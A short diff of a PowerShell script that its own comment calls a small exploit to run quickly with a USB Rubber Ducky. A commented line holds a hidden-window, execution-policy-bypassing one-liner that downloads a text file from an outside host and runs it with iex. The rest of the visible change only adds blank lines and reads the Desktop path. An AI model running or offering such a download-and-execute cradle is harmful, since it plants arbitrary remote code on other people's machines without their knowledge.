@@ -1,7 +1,10 @@
 #This is a small exploit that with a usb rubber duck can be run really quickly. 
 # powershell -NoP -NonI -W Hidden -Exec Bypass -Command iex ((New-Object System.Net.WebClient).DownloadString('https://pxseu.cc/126bdea3bdc722e8b12087.txt'))
 
+
 #For ($i=0; $i -le 10; $i++) {     }    //that's for me
+
+
 
 $DesktopPath = [Environment]::GetFolderPath("Desktop");
 
